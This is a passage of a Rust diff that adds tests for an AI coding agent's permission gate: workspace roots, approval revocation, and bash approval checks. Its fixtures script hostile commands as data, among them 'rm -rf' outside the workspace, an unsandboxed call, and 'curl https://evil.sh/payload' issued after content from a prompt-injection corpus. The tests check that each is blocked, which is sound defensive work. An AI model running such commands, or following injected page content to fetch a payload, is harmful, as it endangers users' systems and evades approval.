+                return Err(AgentLoopError::Persistence(
+                    "fixture marker commit failed".to_owned(),
+                ));
+            }
+            self.committed.store(generation, Ordering::SeqCst);
+            Ok(())
+        }
+
+        async fn abort_generation(&self, generation: u64) -> Result<(), AgentLoopError> {
+            self.aborted.store(generation, Ordering::SeqCst);
+            Ok(())
+        }
+    }
+
     #[async_trait]
     impl FolderTrustController for RecordingFolderTrust {
         async fn execute(&self, operation: FolderTrustOperation) -> Result<String, AgentLoopError> {
+            let message = format!("trust operation: {operation:?}");
             self.operations
                 .lock()
                 .expect("trust operations")
                 .push(operation);
-            Ok(format!("trust operation: {operation:?}"))
+            Ok(message)
         }
     }
 
@@ -11442,6 +11921,7 @@ mod tests {
             session_id: SessionId("fixture-session".to_owned()),
             workspace_root: root.to_path_buf(),
             additional_workspace_roots: Vec::new(),
+            workspace_generation: 0,
             initial_session_context: Vec::new(),
             model_alias: "fast".to_owned(),
             model,
@@ -11454,6 +11934,7 @@ mod tests {
             secret_redactor: Arc::new(NoopSecretRedactor),
             checkpoints: Arc::new(NoopMutationCheckpointCoordinator),
             folder_trust: Arc::new(NoopFolderTrustController),
+            workspace_roots: Arc::new(NoopWorkspaceRootController),
             recovered: SessionRecoveredState::default(),
             max_turns: 10,
             identical_tool_failure_limit: 5,
@@ -11626,7 +12107,10 @@ mod tests {
         let mut events = handle.subscribe();
         for (command, expected) in [
             ("/trust", FolderTrustOperation::Status),
-            ("/trust grant", FolderTrustOperation::Grant),
+            (
+                "/trust grant",
+                FolderTrustOperation::Grant { confirmation: None },
+            ),
             ("/trust revoke", FolderTrustOperation::Revoke),
         ] {
             assert_eq!(
@@ -11647,16 +12131,147 @@ mod tests {
             *trust.operations.lock().expect("trust operations"),
             vec![
                 FolderTrustOperation::Status,
-                FolderTrustOperation::Grant,
+                FolderTrustOperation::Grant { confirmation: None },
                 FolderTrustOperation::Revoke,
             ]
         );
     }
 
     #[tokio::test]
-    async fn permissions_slash_command_edits_only_session_rules() {
+    async fn add_dir_swaps_generation_after_durable_virtual_path_event_without_host_path_leak() {
         let root = TempDir::new().expect("tempdir");
-        let permissions = Arc::new(PermissionGate::new(PermissionDecision::Ask));
+        let primary = std::fs::canonicalize(root.path()).expect("canonical primary");
+        let added_dir = TempDir::new().expect("added tempdir");
+        let added = std::fs::canonicalize(added_dir.path()).expect("canonical added");
+        let tools = Arc::new(ToolRegistry::new());
+        let permissions = Arc::new(PermissionGate::new(PermissionDecision::Allow));
+        let controller = Arc::new(FixedWorkspaceRootController {
+            roots: vec![primary.clone(), added.clone()],
+            tools: Arc::clone(&tools),
+            permissions: Arc::clone(&permissions),
+            committed: AtomicU64::new(0),
+            aborted: AtomicU64::new(0),
+            fail_commit: true,
+        });
+        let mut actor_config = config(
+            &primary,
+            Arc::new(ScriptedModel::default()),
+            tools,
+            PermissionDecision::Allow,
+            builtin_hook_dispatcher().expect("hooks"),
+        );
+        actor_config.permissions = permissions;
+        actor_config.workspace_roots = controller.clone();
+        let handle = SessionActor::spawn(actor_config).expect("actor");
+        let mut events = handle.subscribe();
+        handle
+            .send_message(format!("/add-dir {}", added.display()))
+            .await
+            .expect("add root");
+        let changed = next_matching(&mut events, |kind| {
+            matches!(kind, PendingEvent::WorkspaceRootsChanged { .. })
+        })
+        .await;
+        let finished = next_matching(
+            &mut events,
+            |kind| matches!(kind, PendingEvent::CommandFinished { name, .. } if name == "add-dir"),
+        )
+        .await;
+        let wire = format!(
+            "{}{}",
+            serde_json::to_string(&changed.wire).expect("changed wire"),
+            serde_json::to_string(&finished.wire).expect("finished wire")
+        );
+        assert!(!wire.contains(&added.to_string_lossy().to_string()));
+        assert!(wire.contains("@root/1"));
+        assert_eq!(controller.committed.load(Ordering::SeqCst), 0);
+        let mut projected = vec![changed.wire.clone(), finished.wire.clone()];
+        projected[0].meta_mut().expect("changed meta").sequence_id = SequenceId(0);
+        projected[1].meta_mut().expect("finished meta").sequence_id = SequenceId(1);
+        let recovered = project_session_events(&projected).expect("project root generation");
+        assert_eq!(recovered.workspace_generation, 1);
+        assert_eq!(recovered.workspace_roots.len(), 2);
+        let snapshot = handle.snapshot().await.expect("snapshot");
+        assert_eq!(snapshot.workspace_generation, 1);
+        assert_eq!(
+            snapshot
+                .workspace_roots
+                .iter()
+                .map(|root| root.path.as_str())
+                .collect::<Vec<_>>(),
+            vec!["@root/0", "@root/1"]
+        );
+
+        let failing_permissions = Arc::new(PermissionGate::new(PermissionDecision::Allow));
+        let failing_controller = Arc::new(FixedWorkspaceRootController {
+            roots: vec![primary.clone(), added.clone()],
+            tools: Arc::new(ToolRegistry::new()),
+            permissions: Arc::clone(&failing_permissions),
+            committed: AtomicU64::new(0),
+            aborted: AtomicU64::new(0),
+            fail_commit: false,
+        });
+        let mut failing_config = config(
+            &primary,
+            Arc::new(ScriptedModel::default()),
+            Arc::new(ToolRegistry::new()),
+            PermissionDecision::Allow,
+            builtin_hook_dispatcher().expect("hooks"),
+        );
+        failing_config.permissions = failing_permissions;
+        failing_config.workspace_roots = failing_controller.clone();
+        failing_config.event_sink = Arc::new(WorkspaceChangeFailingSink::default());
+        let failing = SessionActor::spawn(failing_config).expect("failing actor");
+        let failure = failing
+            .send_message(format!("/add-dir {}", added.display()))
+            .await
+            .expect_err("durable event failure");
+        let failure_bytes = format!("{failure:?}{failure}");
+        assert!(!failure_bytes.contains(&added.to_string_lossy().to_string()));
+        let unchanged = failing.snapshot().await.expect("unchanged snapshot");
+        assert_eq!(unchanged.workspace_generation, 0);
+        assert_eq!(unchanged.workspace_roots.len(), 1);
+        assert_eq!(failing_controller.committed.load(Ordering::SeqCst), 0);
+        assert_eq!(failing_controller.aborted.load(Ordering::SeqCst), 1);
+    }
+
+    #[tokio::test]
+    #[allow(clippy::too_many_lines)]
+    async fn permissions_slash_command_edits_rules_and_revokes_opaque_approvals() {
+        let root = TempDir::new().expect("tempdir");
+        let permissions = Arc::new(
+            PermissionGate::new(PermissionDecision::Ask)
+                .with_workspace_roots([root.path()])
+                .with_project_approval_file(root.path().join("approvals.json")),
+        );
+        let approval_request = |id: &str, secret: &str| PermissionRequest {
+            id: id.to_owned(),
+            tool_name: "bash".to_owned(),
+            arguments: json!({"command": format!("printf {secret}")}),
+            capabilities: vec![rw_types::ToolCapability::Execute],
+            approval_diff: None,
+        };
+        assert_eq!(
+            permissions
+                .authorize(
+                    approval_request("session", "SESSION_SECRET_CANARY"),
+                    &StaticApprover(ApprovalDecision::AllowSession),
+                )
+                .await,
+            PermissionOutcome::Allowed
+        );
+        assert_eq!(
+            permissions
+                .authorize(
+                    approval_request("project", "PROJECT_SECRET_CANARY"),
+                    &StaticApprover(ApprovalDecision::AllowProject),
+                )
+                .await,
+            PermissionOutcome::Allowed
+        );
+        let approvals = permissions.approval_snapshot();
+        let session_id = approvals.session[0].id.clone();
+        let project_id = approvals.project[0].id.clone();
         let mut actor_config = config(
             root.path(),
             Arc::new(ScriptedModel::default()),
@@ -11667,6 +12282,33 @@ mod tests {
         actor_config.permissions = permissions.clone();
         let handle = SessionActor::spawn(actor_config).expect("actor");
         let mut events = handle.subscribe();
+        handle
+            .send_message("/permissions approvals")
+            .await
+            .expect("list approvals");
+        let listed = next_matching(&mut events, |kind| {
+            matches!(kind, PendingEvent::CommandFinished { name, .. } if name == "permissions")
+        })
+        .await;
+        let PendingEvent::CommandFinished { message, .. } = listed.kind else {
+            unreachable!("permission command event")
+        };
+        assert!(message.contains(&session_id));
+        assert!(message.contains(&project_id));
+        assert!(!message.contains("SESSION_SECRET_CANARY"));
+        assert!(!message.contains("PROJECT_SECRET_CANARY"));
+        for command in [
+            format!("/permissions revoke-session {session_id}"),
+            format!("/permissions revoke-project {project_id}"),
+        ] {
+            handle.send_message(command).await.expect("revoke approval");
+            next_matching(&mut events, |kind| {
+                matches!(kind, PendingEvent::CommandFinished { name, .. } if name == "permissions")
+            })
+            .await;
+        }
+        assert!(permissions.approval_snapshot().session.is_empty());
+        assert!(permissions.approval_snapshot().project.is_empty());
         for command in [
             "/permissions add allow bash(cargo test*)",
             "/permissions add deny bash(rm *)",
@@ -11706,6 +12348,16 @@ mod tests {
         })
         .await;
         assert_eq!(permissions.snapshot().session_rules.len(), 1);
+        assert_eq!(
+            permissions
+                .authorize(
+                    approval_request("clear", "CLEAR_SECRET_CANARY"),
+                    &StaticApprover(ApprovalDecision::AllowSession),
+                )
+                .await,
+            PermissionOutcome::Allowed
+        );
+        assert_eq!(permissions.snapshot().session_approvals, 1);
         handle
             .send_message("/permissions clear-session")
             .await
@@ -11715,6 +12367,7 @@ mod tests {
         })
         .await;
         assert!(permissions.snapshot().session_rules.is_empty());
+        assert_eq!(permissions.snapshot().session_approvals, 0);
         assert!(permissions.snapshot().rules.is_empty());
     }
 
@@ -12834,6 +13487,443 @@ mod tests {
             .await;
             assert_eq!(tool.calls.load(Ordering::SeqCst), expected_calls);
         }
+    }
+
+    #[tokio::test]
+    async fn destructive_bash_default_ask_prompts_once_and_denial_never_executes() {
+        let root = TempDir::new().expect("tempdir");
+        let model = Arc::new(ScriptedModel::new([
+            tool_script(
+                &[(
+                    "destructive-call",
+                    "bash",
+                    json!({
+                        "command": "rm -rf /tmp/outside-workspace",
+                        "cwd": ".",
+                        "env": {},
+                        "network_domains": [],
+                    }),
+                )],
+                &[],
+            ),
+            stop_script("denied", &[]),
+        ]));
+        let tool = Arc::new(StubTool::new(
+            "bash",
+            vec![ToolCapability::Execute, ToolCapability::WriteFilesystem],
+            StubOutcome::Success(ToolResult::new("must not execute", Value::Null)),
+        ));
+        let mut tools = ToolRegistry::new();
+        tools.register(tool.clone()).expect("register bash fixture");
+        let handle = SessionActor::spawn(config(
+            root.path(),
+            model,
+            Arc::new(tools),
+            PermissionDecision::Ask,
+            builtin_hook_dispatcher().expect("hooks"),
+        ))
+        .expect("actor");
+        let mut events = handle.subscribe();
+        handle.send_message("delete it").await.expect("message");
+
+        let approval = next_matching(&mut events, |kind| {
+            matches!(kind, PendingEvent::PermissionRequested { .. })
+        })
+        .await;
+        let PendingEvent::PermissionRequested { request, .. } = approval.kind else {
+            unreachable!("matching event")
+        };
+        assert_eq!(request.tool_name, "bash");
+        assert_eq!(
+            request.arguments["command"],
+            "rm -rf /tmp/outside-workspace"
+        );
+        assert!(
+            handle
+                .approve(request.id, ApprovalDecision::Deny)
+                .await
+                .expect("approval response")
+        );
+
+        let remaining = collect_turn(&mut events).await;
+        assert!(remaining.iter().any(|event| matches!(
+            event.kind,
+            PendingEvent::ToolCallFinished { is_error: true, .. }
+        )));
+        assert_eq!(
+            remaining
+                .iter()
+                .filter(|event| matches!(event.kind, PendingEvent::PermissionRequested { .. }))
+                .count(),
+            0,
+            "the single destructive invocation must ask exactly once"
+        );
+        assert_eq!(tool.calls.load(Ordering::SeqCst), 0);
+    }
+
+    #[tokio::test]
+    async fn unsandboxed_bash_denial_is_conspicuous_and_never_reaches_the_executor() {
+        let root = TempDir::new().expect("tempdir");
+        let model = Arc::new(ScriptedModel::new([
+            tool_script(
+                &[(
+                    "unsandboxed-call",
+                    "bash",
+                    json!({
+                        "command": "/bin/echo escape",
+                        "cwd": ".",
+                        "env": {},
+                        "network_domains": [],
+                        "sandbox": "unsandboxed",
+                    }),
+                )],
+                &[],
+            ),
+            stop_script("denied", &[]),
+        ]));
+        let tool = Arc::new(StubTool::new(
+            "bash",
+            vec![ToolCapability::Execute, ToolCapability::WriteFilesystem],
+            StubOutcome::Success(ToolResult::new("must not execute", Value::Null)),
+        ));
+        let mut tools = ToolRegistry::new();
+        tools.register(tool.clone()).expect("register bash fixture");
+        let handle = SessionActor::spawn(config(
+            root.path(),
+            model,
+            Arc::new(tools),
+            PermissionDecision::Ask,
+            builtin_hook_dispatcher().expect("hooks"),
+        ))
+        .expect("actor");
+        let mut events = handle.subscribe();
+        handle.send_message("escape").await.expect("message");
+        let approval = next_matching(&mut events, |kind| {
+            matches!(kind, PendingEvent::PermissionRequested { .. })
+        })
+        .await;
+        assert!(matches!(
+            &approval.wire,
+            EngineEvent::ToolApprovalNeeded { rationale, args, .. }
+                if rationale.contains("UNSANDBOXED EXECUTION")
+                    && args["sandbox"] == "unsandboxed"
+        ));
+        let PendingEvent::PermissionRequested { request, .. } = approval.kind else {
+            unreachable!("matching event")
+        };
+        assert!(
+            handle
+                .approve(request.id, ApprovalDecision::Deny)
+                .await
+                .expect("deny")
+        );
+        collect_turn(&mut events).await;
+        assert_eq!(tool.calls.load(Ordering::SeqCst), 0);
+    }
+
+    #[tokio::test]
+    async fn user_safe_list_cargo_test_fixture_runs_without_an_approval_event() {
+        let root = TempDir::new().expect("tempdir");
+        let model = Arc::new(ScriptedModel::new([
+            tool_script(
+                &[(
+                    "cargo-test-call",
+                    "bash",
+                    json!({
+                        "command": "cargo test",
+                        "cwd": ".",
+                        "env": {},
+                        "network_domains": [],
+                        "sandbox": "sandboxed",
+                    }),
+                )],
+                &[],
+            ),
+            stop_script("done", &[]),
+        ]));
+        let tool = Arc::new(StubTool::new(
+            "bash",
+            vec![ToolCapability::Execute],
+            StubOutcome::Success(ToolResult::new("tests passed", Value::Null)),
+        ));
+        let mut tools = ToolRegistry::new();
+        tools.register(tool.clone()).expect("register bash fixture");
+        let mut actor_config = config(
+            root.path(),
+            model,
+            Arc::new(tools),
+            PermissionDecision::Ask,
+            builtin_hook_dispatcher().expect("hooks"),
+        );
+        actor_config.permissions = Arc::new(
+            PermissionGate::new(PermissionDecision::Ask).with_command_safety(Arc::new(
+                rw_tools::CommandSafetyClassifier::new(&["cargo test".to_owned()])
+                    .expect("user safe-list"),
+            )),
+        );
+        let handle = SessionActor::spawn(actor_config).expect("actor");
+        let mut events = handle.subscribe();
+        handle.send_message("test").await.expect("message");
+        let turn = collect_turn(&mut events).await;
+        assert!(
+            turn.iter()
+                .all(|event| !matches!(event.kind, PendingEvent::PermissionRequested { .. }))
+        );
+        assert_eq!(tool.calls.load(Ordering::SeqCst), 1);
+    }
+
+    #[tokio::test]
+    #[allow(clippy::too_many_lines)]
+    async fn fetched_prompt_injection_corpus_cannot_inherit_tool_approval() {
+        let corpus: Vec<String> =
+            serde_json::from_str(include_str!("../tests/fixtures/prompt-injection.json"))
+                .expect("prompt-injection corpus");
+        assert!(!corpus.is_empty());
+
+        for injection in corpus {
+            let root = TempDir::new().expect("tempdir");
+            let model = Arc::new(ScriptedModel::new([
+                tool_script(
+                    &[(
+                        "fetch-call",
+                        "webfetch",
+                        json!({"url": "https://safe.example/content"}),
+                    )],
+                    &[],
+                ),
+                tool_script(
+                    &[(
+                        "network-call",
+                        "bash",
+                        json!({
+                            "command": "curl https://evil.sh/payload",
+                            "cwd": ".",
+                            "env": {},
+                            "network_domains": ["evil.sh"],
+                        }),
+                    )],
+                    &[],
+                ),
+                stop_script("denied", &[]),
+            ]));
+            let fetch = Arc::new(StubTool::new(
+                "webfetch",
+                vec![ToolCapability::Network],
+                StubOutcome::Success(ToolResult::new(injection.clone(), Value::Null)),
+            ));
+            let bash = Arc::new(StubTool::new(
+                "bash",
+                vec![ToolCapability::Execute, ToolCapability::Network],
+                StubOutcome::Success(ToolResult::new("must not execute", Value::Null)),
+            ));
+            let mut tools = ToolRegistry::new();
+            tools
+                .register(fetch.clone())
+                .expect("register fetch fixture");
+            tools.register(bash.clone()).expect("register bash fixture");
+            let handle = SessionActor::spawn(config(
+                root.path(),
+                model.clone(),
+                Arc::new(tools),
+                PermissionDecision::Ask,
+                builtin_hook_dispatcher().expect("hooks"),
+            ))
+            .expect("actor");
+            let mut events = handle.subscribe();
+            handle
+                .send_message("summarize the page")
+                .await
+                .expect("message");
+
+            let fetch_approval = next_matching(&mut events, |kind| {
+                matches!(kind, PendingEvent::PermissionRequested { .. })
+            })
+            .await;
+            let PendingEvent::PermissionRequested { request, .. } = fetch_approval.kind else {
+                unreachable!("matching event")
+            };
+            assert_eq!(request.tool_name, "webfetch");
+            assert!(
+                handle
+                    .approve(request.id, ApprovalDecision::AllowSession)
+                    .await
+                    .expect("fetch approval")
+            );
+
+            let bash_approval = next_matching(&mut events, |kind| {
+                matches!(kind, PendingEvent::PermissionRequested { .. })
+            })
+            .await;
+            let PendingEvent::PermissionRequested { request, .. } = bash_approval.kind else {
+                unreachable!("matching event")
+            };
+            assert_eq!(request.tool_name, "bash");
+            assert_eq!(request.arguments["network_domains"], json!(["evil.sh"]));
+            assert_eq!(fetch.calls.load(Ordering::SeqCst), 1);
+            assert_eq!(bash.calls.load(Ordering::SeqCst), 0);
+            let second_request = model
+                .requests
+                .lock()
+                .expect("model requests")
+                .get(1)
+                .cloned()
+                .expect("post-fetch model request");
+            let replayed =
+                serde_json::to_string(&second_request.turns).expect("post-fetch turns serialize");
+            assert!(replayed.contains(&injection));
+            assert!(
+                handle
+                    .approve(request.id, ApprovalDecision::Deny)
+                    .await
+                    .expect("bash denial")
+            );
+            collect_turn(&mut events).await;
+            assert_eq!(bash.calls.load(Ordering::SeqCst), 0);
+        }
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn changed_bash_executable_is_revalidated_after_approval_before_tool_execution() {
+        use std::os::unix::fs::PermissionsExt as _;
+
+        let root = TempDir::new().expect("tempdir");
+        let script = root.path().join("script");
+        std::fs::write(&script, "#!/bin/sh\nprintf first\n").expect("script");
+        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700))
+            .expect("executable");
+        let model = Arc::new(ScriptedModel::new([
+            tool_script(
+                &[(
+                    "call",
+                    "bash",
+                    json!({
+                        "command": "./script safe",
+                        "cwd": root.path(),
+                        "env": {},
+                        "network_domains": [],
+                    }),
+                )],
+                &[],
+            ),
+            stop_script("done", &[]),
+        ]));
+        let tool = Arc::new(StubTool::new(
+            "bash",
+            vec![ToolCapability::Execute],
+            StubOutcome::Success(ToolResult::new("should not execute", Value::Null)),
+        ));
+        let mut tools = ToolRegistry::new();
+        tools.register(tool.clone()).expect("register bash fixture");
+        let handle = SessionActor::spawn(config(
+            root.path(),
+            model,
+            Arc::new(tools),
+            PermissionDecision::Ask,
+            builtin_hook_dispatcher().expect("hooks"),
+        ))
+        .expect("actor");
+        let mut events = handle.subscribe();
+        handle.send_message("run").await.expect("message");
+        let event = next_matching(&mut events, |kind| {
+            matches!(kind, PendingEvent::PermissionRequested { .. })
+        })
+        .await;
+        let PendingEvent::PermissionRequested { request, .. } = event.kind else {
+            unreachable!("matching event")
+        };
+        std::fs::write(&script, "#!/bin/sh\nprintf replaced\n").expect("replace executable");
+        assert!(
+            handle
+                .approve(request.id, ApprovalDecision::AllowOnce)
+                .await
+                .expect("approval")
+        );
+        let finished = next_matching(&mut events, |kind| {
+            matches!(kind, PendingEvent::ToolCallFinished { .. })
+        })
+        .await;
+        assert!(matches!(
+            finished.kind,
+            PendingEvent::ToolCallFinished {
+                is_error: true,
+                output: ToolOutput::Text { text },
+                ..
+            } if text.contains("invocation identity changed")
+        ));
+        assert_eq!(tool.calls.load(Ordering::SeqCst), 0);
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn unavailable_remembered_bash_scope_fails_closed_without_executing_tool() {
+        use std::os::unix::fs::PermissionsExt as _;
+
+        let root = TempDir::new().expect("tempdir");
+        let script = root.path().join("script");
+        std::fs::write(&script, "#!/bin/sh\nprintf mutable\n").expect("script");
+        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700))
+            .expect("executable");
+        let model = Arc::new(ScriptedModel::new([
+            tool_script(
+                &[(
+                    "call",
+                    "bash",
+                    json!({
+                        "command": "./script safe",
+                        "cwd": root.path(),
+                        "env": {},
+                        "network_domains": [],
+                    }),
+                )],
+                &[],
+            ),
+            stop_script("done", &[]),
+        ]));
+        let tool = Arc::new(StubTool::new(
+            "bash",
+            vec![ToolCapability::Execute],
+            StubOutcome::Success(ToolResult::new("should not execute", Value::Null)),
+        ));
+        let mut tools = ToolRegistry::new();
+        tools.register(tool.clone()).expect("register bash fixture");
+        let handle = SessionActor::spawn(config(
+            root.path(),
+            model,
+            Arc::new(tools),
+            PermissionDecision::Ask,
+            builtin_hook_dispatcher().expect("hooks"),
+        ))
+        .expect("actor");
+        let mut events = handle.subscribe();
+        handle.send_message("run").await.expect("message");
+        let event = next_matching(&mut events, |kind| {
+            matches!(kind, PendingEvent::PermissionRequested { .. })
+        })
+        .await;
+        let PendingEvent::PermissionRequested { request, .. } = event.kind else {
+            unreachable!("matching event")
+        };
+        assert!(
+            handle
+                .approve(request.id, ApprovalDecision::AllowProject)
+                .await
+                .expect("approval response")
+        );
+        let finished = next_matching(&mut events, |kind| {
+            matches!(kind, PendingEvent::ToolCallFinished { .. })
+        })
+        .await;
+        assert!(matches!(
+            finished.kind,
+            PendingEvent::ToolCallFinished {
+                is_error: true,
+                output: ToolOutput::Text { text },
+                ..
+            } if text.contains("remembered_permission_unavailable")
+                && text.contains("choose allow once")
+        ));
+        assert_eq!(tool.calls.load(Ordering::SeqCst), 0);
     }
 
     #[tokio::test]
